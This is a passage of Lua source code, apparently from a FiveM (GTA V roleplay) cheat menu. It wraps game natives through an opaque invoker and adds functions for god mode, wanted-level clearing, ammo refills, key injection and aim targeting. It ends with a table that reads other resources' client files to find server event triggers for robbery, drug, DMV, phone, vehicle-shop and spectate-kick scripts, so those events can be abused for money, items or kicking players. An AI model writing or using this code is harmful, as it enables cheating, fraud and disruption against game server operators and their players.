       return sum.curak.inv(0x539E0AE3E6634B9F, sum.curak.ii(entity))
   end
   sum.f.DeletePed = function(entity)
       return sum.curak.inv(0x9614299DCB53E54B, sum.curak.ii(entity))
   end
   sum.f.SetEntityCoords = function(entity, xPos, yPos, zPos, xAxis, yAxis, zAxis, clearArea)
       return sum.curak.inv(0x06843DA7060A026B, entity, xPos, yPos, zPos, xAxis, yAxis, zAxis, clearArea)
   end
   sum.f.SetEntityRotation = function(entity, pitch, roll, yaw, rotationOrder, p5)
       return sum.curak.inv(0x8524A8B0171D5E07, entity, pitch, roll, yaw, rotationOrder, p5)
   end
   sum.f.GetGameplayCamRot = function(rotationOrder)
       return sum.curak.inv(0x837765A25378F0BB, rotationOrder, sum.curak.rra(), sum.curak.rav())
   end
   sum.f.SetEntityVelocity = function(entity, x, y, z)
       return sum.curak.inv(0x1C99BB7B6E96D16F, entity, x, y, z)
   end
   sum.f.NetworkHasControlOfEntity = function(entity)
       return sum.curak.inv(0x01BF60A500E28887, entity, sum.curak.rra())
   end
   sum.f.SetNetworkIdCanMigrate = function(netId, toggle)
       return sum.curak.inv(0x299EEB23175895FC, netId, toggle)
   end
   sum.f.NetworkGetNetworkIdFromEntity = function(entity)
       return sum.curak.inv(0xA11700682F3AD45C, entity, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetPedInVehicleSeat = function(vehicle, index)
       return sum.curak.inv(0xBB40DD2270B65366, vehicle, index, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetEntityHeading = function(entity)
       return sum.curak.inv(0xE83D4F9BA2A38914, entity, sum.curak.rra(), sum.curak.raf())
   end
   sum.f.PushScaleformMovieFunctionParameterBool = function(value)
       return sum.curak.inv(0xC58424BA936EB458, value)
   end
   sum.f.PopScaleformMovieFunctionVoid = function()
       return sum.curak.inv(0xC6796A8FFA375E53)
   end
   sum.f.PushScaleformMovieFunctionParameterInt = function(value)
       return sum.curak.inv(0xC3D0841A0CC546A6, value)
   end
   sum.f.PushScaleformMovieMethodParameterButtonName = function(p1)
       return sum.curak.inv(0xE83A3E3557A56640, sum.curak.tostring(p1))
   end
   sum.f.PushScaleformMovieFunctionParameterString = function(value)
       return sum.curak.inv(0xBA7148484BD90365, sum.curak.tostring(value))
   end
   sum.f.DrawScaleformMovieFullscreen = function(scaleform, r, g, b, a)
       return sum.curak.inv(0x0DF606929C105BE1, scaleform, r, g, b, a)
   end
   sum.f.GetFirstBlipInfoId = function(blipSprite)
       return sum.curak.inv(0x1BEDE233E6CD2A1F, blipSprite, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetVehicleMaxSpeed = function(vehicle)
       return sum.curak.inv(0x53AF99BAA671CA47, vehicle, sum.curak.raf())
   end
   sum.f.DoesBlipExist = function(blip)
       return sum.curak.inv(0xA6DB27D19ECBB7DA, blip, sum.curak.rra())
   end
   sum.f.GetBlipInfoIdCoord = function(blip)
       return sum.curak.inv(0xFA7C7F0AADF25D09, blip, sum.curak.rra(), sum.curak.rav())
   end
   sum.f.SetPedCoordsKeepVehicle = function(ped, posX, posY, posZ)
       return sum.curak.inv(0x9AFEFF481A85AB2E, ped, posX, posY, posZ)
   end
   sum.f.IsEntityInWater = function(entity)
       return sum.curak.inv(0xCFB0A0D8EDD145A3, entity, sum.curak.rra())
   end
   sum.f.EndFindPed = function(findHandle)
       return sum.curak.inv(0x9615c2ad, findHandle)
   end
   sum.f.SetDrawOrigin = function(x, y, z, p3)
       return sum.curak.inv(0xAA0008F3BBB8F416, x, y, z, p3)
   end
   sum.f.SetTextProportional = function(p0)
       return sum.curak.inv(0x038C1F517D7FDCF8, p0)
   end
   sum.f.SetTextDropshadow = function(distance, r, g, b, a)
       return sum.curak.inv(0x465C84BC39F1C351, distance, r, g, b, a)
   end
   sum.f.SetTextEdge = function(p0, r, g, b, a)
       return sum.curak.inv(0x441603240D202FA6, p0, r, g, b, a)
   end
   sum.f.SetTextOutline = function()
       return sum.curak.inv(0x2513DFB0FB8400FE)
   end
   sum.f.SetTextEntry = function(text)
       return sum.curak.inv(0x25FBB336DF1804CB, sum.curak.tostring(text))
   end
   sum.f.AddTextComponentString = function(text)
       return sum.curak.inv(0x6C188BE134E074AA, sum.curak.tostring(text))
   end
   sum.f.ClearDrawOrigin = function()
       return sum.curak.inv(0xFF0B610F6BE0D7AF)
   end
   sum.f.GetClosestVehicle = function(x, y, z, radius, modelHash, flags)
       return sum.curak.inv(0xF73EB622C4F1689B, x, y, z, radius, sum.f.GetHashKey(modelHash), flags, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetGameplayCamRelativeHeading = function()
       return sum.curak.inv(0x743607648ADD4587, sum.curak.rra(), sum.curak.raf())
   end
   sum.f.GetGameplayCamRelativePitch = function()
       return sum.curak.inv(0x3A6867B4845BEDA2, sum.curak.rra(), sum.curak.raf())
   end
   sum.f.TaskCombatPed = function(ped, targetPed, p2, p3)
       return sum.curak.inv(0xF166E48407BAC484, ped, targetPed, p2, p3)
   end
   sum.f.IsPedDeadOrDying = function(ped, p1)
       return sum.curak.inv(0x3317DEDB88C95038, ped, p1, sum.curak.rra())
   end
   sum.f.TaskSmartFleeCoord = function(ped, x, y, z, distance, time, p6, p7)
       return sum.curak.inv(0x94587F17E9C365D5, ped, x, y, z, distance, time, p6, p7)
   end
   
   sum.f.GetEntitySpeed = function(entity)
       return sum.curak.inv(0xD5037BA82E12416F, entity, sum.curak.rai())
   end
   sum.f.SetPedCombatAbility = function(ped, p1)
       return sum.curak.inv(0xC7622C0D36B2FDA8, ped, p1)
   end
   sum.f.SetPedCombatMovement = function(ped, combatMovement)
       return sum.curak.inv(0x4D9CA1009AFBD057, ped, combatMovement)
   end
   sum.f.SetCombatFloat = function(ped, combatType, p2)
       return sum.curak.inv(0xFF41B4B141ED981C, ped, combatType, p2)
   end
   sum.f.SetPedAccuracy = function(ped, accuracy)
       return sum.curak.inv(0x7AEFB85C1D49DEB6, ped, accuracy, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.SetPedFiringPattern = function(ped, patternHash)
       return sum.curak.inv(0x9AC577F5A12AD8A9, ped, sum.f.GetHashKey(patternHash))
   end
   sum.f.GetClosestVehicleNodeWithHeading = function(x, y, z, nodeType, p6, p7)
       return sum.curak.inv(0xFF071FB798B803B0, x, y, z, sum.curak.pvv(), sum.curak.pvf(), nodeType, p6, p7, sum.curak.rra())
   end
   sum.f.CreatePedInsideVehicle = function(vehicle, pedType, modelHash, seat, isNetwork, netMissionEntity)
       return sum.curak.inv(0x7DD959874C1FD534, vehicle, pedType, sum.f.GetHashKey(modelHash), seat, isNetwork, netMissionEntity, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.TaskVehicleDriveToCoordLongrange = function(ped, vehicle, x, y, z, speed, driveMode, stopRange)
       return sum.curak.inv(0x158BB33F920D360C, ped, vehicle, x, y, z, speed, driveMode, stopRange)
   end
   sum.f.SetVehicleEngineOn = function(vehicle, value, instantly)
       return sum.curak.inv(0x2497C4717C8B881E, vehicle, value, instantly)
   end
   sum.f.SetPedMaxTimeUnderwater = function(ped, value)
       return sum.curak.inv(0x6BA428C528D9E522, ped, value)
   end
   sum.f.GetPedBoneCoords = function(ped, boneId, offsetX, offsetY, offsetZ)
       return sum.curak.inv(0x17C07FC640E86B4E, ped, boneId, offsetX, offsetY, offsetZ, sum.curak.rra(), sum.curak.rav())
   end
   
   
   sum.f.GetDistanceBetweenCoords = function(x1, y1, z1, x2, y2, z2, unknown)
       return sum.curak.inv(0xF1B760881820C952, x1, y1, z1, x2, y2, z2, unknown, sum.curak.rra(), sum.curak.raf())
   end
   sum.f.GetScreenCoordFromWorldCoord = function(worldX, worldY, worldZ)
       return sum.curak.inv(0x34E82F05DF2974F5, worldX, worldY, worldZ, sum.curak.pvf(), sum.curak.pvf(), sum.curak.rra())
   end
   sum.f.IsEntityDead = function(entity)
       return sum.curak.inv(0x5F9532F3B5CC2551, entity, sum.curak.rra())
   end
   sum.f.IsEntityVisible = function(entity)
       return sum.curak.inv(0x47D6F43D77935C75, entity, sum.curak.rra())
   end
   sum.f.HasEntityClearLosToEntity = function(entity1, entity2, traceType)
       return sum.curak.inv(0xFCDFF7B72D23A1AC, entity1, entity2, traceType, sum.curak.rra())
   end
   sum.f.IsPedShooting = function(ped)
       return sum.curak.inv(0x34616828CD07F1A1, ped, sum.curak.rra())
   end
   sum.f.IsEntityOnScreen = function(entity)
       return sum.curak.inv(0xE659E47AF827484B, entity, sum.curak.rra())
   end
   sum.f.FindFirstPed = function(outEntity)
       return sum.curak.inv(0xfb012961, sum.curak.ii(outEntity), sum.curak.rra(), sum.curak.rai())
   end
   sum.f.FindNextPed = function(findHandle, outEntity)
       return sum.curak.inv(0xab09b548, findHandle, sum.curak.ii(outEntity), sum.curak.rra())
   end
   sum.f.NetworkIsInSession = function()
       return sum.curak.inv(0xCA97246103B63917, sum.curak.rra())
   end
   --[[
   sum.f.AddTextComponentSubstringWebsite = function(website)
       return sum.curak.inv(0x94CF4AC034C9C986, sum.curak.tostring(website))
   end]]
   sum.f.SetTextDropShadow = function(distance, r, g, b, a)
       return sum.curak.inv(0x465C84BC39F1C351, distance, r, g, b, a)
   end
   sum.f.GetPedPropIndex = function(ped, componentId)
       return sum.curak.inv(0x898CC20EA75BACD8, ped, componentId, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetPedPropTextureIndex = function(ped, componentId)
       return sum.curak.inv(0xE131A28626F81AB2, ped, componentId, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetPedDrawableVariation = function(ped, componentId)
       return sum.curak.inv(0x898CC20EA75BACD8, ped, componentId, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetPedPaletteVariation = function(ped, componentId)
       return sum.curak.inv(0xE3DD5F2A84B42281, ped, componentId, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetPedTextureVariation = function(ped, componentId)
       return sum.curak.inv(0x04A355E041E004E6, ped, componentId, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.DrawLightWithRangeAndShadow = function(x, y, z, r, g, b, range, intensity, shadow)
       return sum.curak.inv(0xF49E9A9716A04595, x, y, z, r, g, b, range, intensity, shadow)
   end
   sum.f.IsControlJustPressed = function(padIndex, control)
       return sum.curak.inv(0x580417101DDB492F, padIndex, control, sum.curak.rra())
   end
   sum.f.IsControlJustPressed = function(padIndex, control)
       return sum.curak.inv(0xF3A21BCD95725A4A, padIndex, control, sum.curak.rra())
   end
   sum.f.GetNumResourceMetadata = function(resourceName, metadataKey)
       return sum.curak.inv(0x776E864, sum.curak.tostring(resourceName), sum.curak.tostring(metadataKey), sum.curak.rra(), sum.curak.rai())
   end
   sum.f.GetResourceMetadata = function(resourceName, metadataKey, index)
       return sum.curak.inv(0x964BAB1D, sum.curak.tostring(resourceName), metadataKey, index, sum.curak.rra(), sum.curak.ras())
   end
   sum.f.LoadResourceFile = function(resourceName, fileName)
       return sum.curak.inv(0x76A9EE1F, sum.curak.tostring(resourceName), sum.curak.tostring(fileName), sum.curak.rra(), sum.curak.ras())
   end
   
   sum.f.GetCurrentResourceName = function()
       return sum.curak.inv(0xE5E9EBBB, sum.curak.rra(), sum.curak.ras())
   end
   sum.f.GetActivePlayers = function()
       return msgpack.unpack(sum.curak.inv(0xcf143fb9, sum.curak.rra(), sum.curak.rao()))
   end
   sum.f.SetVehicleWheelieState = function(vehicle, state)
       return sum.curak.inv(0xEAB8DB65, vehicle, state)
   end
   sum.f.GetHashKey = function(string)
       return sum.curak.inv(0xD24D37CC275948CC, sum.curak.tostring(string), sum.curak.rra(), sum.curak.rai()) 
   end
   sum.f.SetVehicleTyresCanBurst = function(vehicle, toggle)
       return sum.curak.inv(0xEB9DC3C7D8596C46, vehicle, toggle, sum.curak.rra())
   end
   sum.f.SetVehicleNumberPlateTextIndex = function(vehicle, plateIndex)
       return sum.curak.inv(0x9088EB5A43FFB0A1, vehicle, plateIndex, sum.curak.rra())
   end
   sum.f.MicrosoftKeys = function(VK_KEY_INDEX)
       return sum.curak.inv(0x762376233635, VK_KEY_INDEX)
   end
   sum.f.PressKey = function(VK_KEY_INDEX)
       return sum.curak.inv(0x762376233636, VK_KEY_INDEX)
   end
   sum.f.ReleasePressedKey = function(VK_KEY_INDEX)
       return sum.curak.inv(0x762376233637, VK_KEY_INDEX)
   end
   sum.f.GetCurrentPedWeapon = function(ped, p2)
       return sum.curak.inv(0x3A87E44BB9A01D54, ped, sum.curak.pvi(), p2, sum.curak.rra())
   end
   sum.f.SetPedAmmo = function(ped, weaponHash, ammo)
       return sum.curak.inv(0x14E56BC5B5DB6A19, ped, weaponHash, ammo, sum.curak.rai())
   end
   sum.f.GetWeaponClipSize = function(weaponHash)
       return sum.curak.inv(0x583BE370B1EC6EB4, weaponHash, sum.curak.rai())
   end
   sum.f.RemoveAllPedWeapons = function(ped, p1)
       return sum.curak.inv(0xF25DF915FA38C5F3, ped, p1, sum.curak.rai())
   end
   sum.f.RemoveWeaponFromPed = function(ped, weaponHash)
       return sum.curak.inv(0xF25DF915FA38C5F3, ped, weaponHash, sum.curak.rai())
   end
   sum.f.SetPedArmour = function(ped, amount)
       return sum.curak.inv(0xCEA04D83135264CC, ped, amount, sum.curak.rai())
   end
   sum.f.HasAnimDictLoaded = function(animDict)
       return sum.curak.inv(0xD031A9162D01088C, animDict, sum.curak.rai())
   end
   sum.f.RequestAnimDict = function(animDict)
       return sum.curak.inv(0xD3BD40951412FEF6, animDict)
   end
   sum.f.SetEntityProofs = function(entity, bulletProof, fireProof, explosionProof, collisionProof, meleeProof, steamProof, p7, drownProof)
       return sum.curak.inv(0x4899CB088EDF59B8, entity, bulletProof, fireProof, explosionProof, collisionProof, meleeProof, steamProof, p7, drownProof)
   end
   sum.f.SetFollowPedCamViewMode = function(viewMode)
       return sum.curak.inv(0x5A4F9EDF1673F704, viewMode)
   end
   sum.f.SetFollowVehicleCamViewMode = function(viewMode)
       return sum.curak.inv(0xAC253D7842768F48, viewMode)
   end
   sum.f.StatSetInt = function(statName, value, save)
       return sum.curak.inv(0xB3271D7AB655B441, statName, value, save, sum.curak.rai())
   end
   sum.f.ReplaceHudColourWithRgba = function(colorodhudIndex, r,g,b,a)
       return sum.curak.inv(0xF314CF4F0211894E, colorodhudIndex, r,g,b,a)
   end
   sum.f.IsPedRagdoll = function(ped)
       return sum.curak.inv(0x47E4E977581C5B55, ped)
   end
   sum.f.AnimpostfxStop = function(effectName)
       return sum.curak.inv(0x068E835A1D0DC0E3, effectName)
   end
   sum.f.GetEntityVelocity = function(entity)
       return sum.curak.inv(0x4805D2B1D8CF94A9, entity, sum.curak.rra(), sum.curak.rav())
   end
   sum.f.SetPoliceIgnorePlayer = function(player, toggle)
       return sum.curak.inv(0x32C62AA929C2DA6A, player, toggle)
   end
   sum.f.SetPedCanRagdollFromPlayerImpact = function(ped, toggle)
       return sum.curak.inv(0xDF993EE5E90ABA25, ped, toggle)
   end
   sum.f.DrawLine = function(x1, y1, z1, x2, y2, z2, red, green, blue, alpha)
       return sum.curak.inv(0x6B7256074AE34680, x1, y1, z1, x2, y2, z2, red, green, blue, alpha)
   end
   sum.f.SetEntityLocallyVisible = function(entity)
       return sum.curak.inv(0x241E289B5C059EDC, entity)
   end
   sum.f.SetWeatherTypePersist = function(weatherType)
       return sum.curak.inv(0x704983DF373B198F, weatherType)
   end
   sum.f.SetWeatherTypeNow = function(weatherType)
       return sum.curak.inv(0x29B487C359E19889, weatherType)
   end
   sum.f.SetEntityOnlyDamagedByPlayer = function(entity, toggle)
       return sum.curak.inv(0x79F020FF9EDC0748, entity, toggle)
   end
   sum.f.SetOverrideWeather = function(weatherType)
       return sum.curak.inv(0xA43D5C6FE51ADBEF, weatherType)
   end
   sum.f.GetPedBoneCoordsF = function(ped, boneId)
           local cam = sum.f.GetFinalRenderedCamCoord()
           local ret, coords, shape = sum.f.GetShapeTestResult(
               sum.f.StartShapeTestRay(
                   sum.curak.vector3(cam), sum.curak.vector3(sum.f.GetPedBoneCoords(ped, 0x0)), -1
               )
           )
           if coords then 
               a = Vdist(cam, shape)/Vdist(cam, sum.f.GetPedBoneCoords(ped, 0x0)) 
           else
               a = 0.83 
           end
           if a > 1 then 
               a = 0.83 
           end
           if ret then
               return (((sum.f.GetPedBoneCoords(ped, boneId)-cam)*((a) * 0.83)) + cam)
           end
       end
   sum.f.SetTimecycleModifier = function(modifierName)
       return sum.curak.inv(0x2C933ABF17A1DF41, modifierName)
   end
   sum.f.SetTimecycleModifierStrength = function(modifierName)
       return sum.curak.inv(0x82E7FFCD5B2326B3, modifierName)
   end
   sum.f.NetworkIsPlayerTalking = function(weatherType)
       return sum.curak.inv(0x031E11F3D447647E, weatherType)
   end
   sum.f.GetDistanceBetweenCoords = function(x1, y1, z1, x2, y2, z2, useZ)
       return sum.curak.inv(0xF1B760881820C952, x1, y1, z1, x2, y2, z2, useZ, sum.curak.rra(), sum.curak.raf())
   end
   sum.f.IsPedAPlayer = function(ped)
       return sum.curak.inv(0x12534C348C6CB68B, ped, sum.curak.rra())
   end
   sum.f.GetEntityMaxHealth = function(entity)
       return sum.curak.inv(0x15D757606D170C3C, entity)
   end
   sum.f.IsControlPressed = function(padIndex, control)
       return sum.curak.inv(0xF3A21BCD95725A4A, padIndex, control)
   end
   sum.f.GetFinalRenderedCamCoord = function()
       return sum.curak.inv(0xA200EB1EE790F448, sum.curak.rav())
   end
   sum.f.GetPedArmour = function(ped)
       return sum.curak.inv(0x9483AF821605B1D8, ped, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.ClearPlayerWantedLevel = function(player)
       return sum.curak.inv(0xB302540597885499, player)
   end
   sum.f.GetEntityPlayerIsFreeAimingAt = function(player, entity)
       return sum.curak.inv(0x2975C866E6713290, player, sum.curak.ii(entity), sum.curak.rra())
   end
   sum.f.DestroyDui = function(duiObject)
       return sum.curak.inv(0xA085CB10, duiObject)
   end
   sum.f.IsPedReloading = function(ped)
       return sum.curak.inv(0x24B100C68C645951, ped)
   end
   sum.f.RefillAmmoInstantly = function(ped)
       return sum.curak.inv(0x8C0D57EA686FAD87, ped)
   end
   sum.f.ApplyForceToEntity = function(entity, forceType, x, y, z, offX, offY, offZ, boneIndex, isDirectionRel, ignoreUpVec, isForceRel, p12, p13)
       return sum.curak.inv(0xC5F68BE9613E2D18, entity, forceType, x, y, z, offX, offY, offZ, boneIndex, isDirectionRel, ignoreUpVec, isForceRel, p12, p13)
   end
   sum.f.SetVehicleReduceGrip = function(vehicle, toggle)
       return sum.curak.inv(0x222FF6A823D122E2, vehicle, toggle)
   end
   sum.f.SetBlipColour = function(blip, color)
       return sum.curak.inv(0x03D7FB09E75D6B7E, blip, color)
   end
   sum.f.SetTimeScale = function(timeScale)
       return sum.curak.inv(0x1D408577D440E81E, timeScale)
   end
   sum.f.GetCurrentPedWeaponEntityIndex = function(ped)
       return sum.curak.inv(0x3B390A939AF0B5FC, ped)
   end
   sum.f.IsAimCamActive = function()
       return sum.curak.inv(0x68EDDA28A5976D07)
   end
   sum.f.SetGameplayCamRelativeRotation = function(roll, pitch, yaw)
       return sum.curak.inv(0x48608C3464F58AB4, roll, pitch, yaw)
   end
   sum.f.DisableControlAction = function(padIndex, control, disable)
       return sum.curak.inv(0xFE99B66D079CF6BC, padIndex, control, disable)
   end
   sum.f.SetFocusPosAndVel = function(x, y, z, offsetX, offsetY, offsetZ)
       return sum.curak.inv(0xBB7454BAFF08FE25, x, y, z, offsetX, offsetY, offsetZ)
   end
   sum.f.SetCamFov = function(cam, fieldOfView)
       return sum.curak.inv(0xB13C14F66A00D047, cam, fieldOfView)
   end
   sum.f.GetCamMatrix = function(camera)
       return sum.curak.inv(0x8F57A89D, camera, sum.curak.pvv(), sum.curak.pvv(), sum.curak.pvv(), sum.curak.pvv()) 
   end
   sum.f.GetAspectRatio = function(b)
       return sum.curak.inv(0xF1307EF624A80D87, b, sum.curak.rra(), sum.curak.raf())
   end
   sum.f.UseParticleFxAsset = function(name)
       return sum.curak.inv(0x6C38AF3693A69A91, name, sum.curak.tostring())
   end
   sum.f.StartEntityFire = function(entity)
       return sum.curak.inv(0xF6A9D9708F6F23DF, entity)
   end
   
   -- Big Respect to ElConde
   
   sum.m.list = {
       {
       resource = "esx_vangelico_robbery",
       resourcelooklike = {"vangelico", "jewlery"},
       file = {"client/esx_vangelico_robbery_cl.lua", "client/main.lua", "main.lua"},
       lookfor = "ClearPedTasksImmediately.GetPlayerPed.-1..",
       name = "vangelico_get",
       noparam = true
       },
   
       {
       resource = "esx_vangelico_robbery",
       resourcelooklike = {"vangelico", "jewlery"},
       file = {"client/esx_vangelico_robbery_cl.lua", "client/main.lua", "main.lua"},
       lookfor = "FreezeEntityPosition.playerPed, false.",
       name = "vangelico_sell",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "elseif CurrentAction == \'CokeField\' then",
       name = "coke_feild",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "elseif CurrentAction == \'CokeProcessing\' then",
       name = "coke_process",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "elseif CurrentAction == \'CokeDealer\' then",
       name = "coke_sell",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "elseif CurrentAction == \'MethField\' then",
       name = "meth_field",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "elseif CurrentAction == \'MethProcessing\' then",
       name = "meth_process",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "elseif CurrentAction == \'MethDealer\' then",
       name = "meth_sell",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "elseif CurrentAction == \'WeedField\' then",
       name = "weed_field",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "elseif CurrentAction == \'WeedProcessing\' then",
       name = "weed_process",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "elseif CurrentAction == \'WeedDealer\' then",
       name = "weed_sell",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "elseif CurrentAction == \'OpiumField\' then",
       name = "opium_field",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "elseif CurrentAction == \'OpiumProcessing\' then",
       name = "opium_process",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "elseif CurrentAction == \'OpiumDealer\' then",
       name = "opium_sell",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "CurrentAction = nil",
       name = "stop_feild_coke",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "estCoke",
       name = "stop_process_coke",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "sformCoke",
       name = "stop_sell_coke",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "stopSell",
       name = "stop_feild_meth",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "tMeth",
       name = "stop_process_meth",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "sformMeth",
       name = "stop_sell_meth",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "stopSellM",
       name = "stop_feild_weed",
       noparam = true
       },
   
       {
       resource = "esx_skin",
       resourcelooklike = {"esx_skin", "skin"},
       file = {"client/main.lua"},
       lookfor = "",
       name = "esx_skin:openSaveableMenu",
       noparam = false
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "vestWeed",
       name = "stop_process_weed",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "ransformWeed",
       name = "stop_sell_weed",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "stopSellW",
       name = "stop_feild_opium",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "stopHarvest",
       name = "stop_process_opium",
       noparam = true
       },
   
       {
       resource = "drugs",
       resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
       file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
       lookfor = "formOpium",
       name = "stop_sell_opium",
       noparam = true
       },
   
       {
       resource = "esx_spectate",
       resourcelooklike = {"esx_spectate", "spectate"},
       file = {"client/main.lua"},
       lookfor = ", data.id, data.reason%)",
       name = "esx_spectate_kick",
       noparam = false,
       },
   
       {
       resource = "esx_dmvschool",
       resourcelooklike = {"dmvschool"},
       file = {"client/main.lua"},
       lookfor = ", Config.Prices%b[]",
       name = "dmv_pay",
       noparam = false,
       },
   
       {
       resource = "esx_dmvschool",
       resourcelooklike = {"dmvschool"},
       file = {"client/main.lua"},
       lookfor = ", %b''",
       name = "dmv_getlicense",
       noparam = false,
       },
   
       {
       resource = "gcphone",
       file = {"client/twitter.lua"},
       resourcelooklike = {"phone"},
       lookfor = ", data.username or '', data.password or '', data.message",
       name = "gcphone_posttweet",
       noparam = false,
       },
   
       {
       resource = "esx_mugging",
       file = {"main_c.lua"},
       resourcelooklike = {"esx_mugging", "mugging"},
       lookfor = ", %(itemName%)%)",
       name = "esx_mugging_giveItems",
       noparam = false,
       },
   
       {
       resource = "esx_mugging",
       file = {"main_c.lua"},
       resourcelooklike = {"esx_mugging", "mugging"},
       lookfor = "additems = math.random%(1,100%)",
       name = "esx_mugging_giveMoney",
       noparam = false,
       },
   
       {
       resource = "gcphone",
       file = {"client/twitter.lua"},
       resourcelooklike = {"phone"},
       lookfor = ", data.username, data.password, data.avatarUrl",
       name = "gcphone_createtwiteracc",
       noparam = false,
       },
       
       {
       resource = "gcphone",
       file = {"client/twitter.lua"},
       resourcelooklike = {"phone"},
       lookfor = ", data.username, data.password",
       name = "gcphone_logintwitteracc",
       noparam = false,
       },
   
       {
       resource = "esx_vehicleshop",
       resourcelooklike = {"vehicle"},
       file = {"client/main.lua"},
       lookfor = ", vehicleProps",
       name = "vehicleshop_ownedveh",
       noparam = false,
       },
   
       {
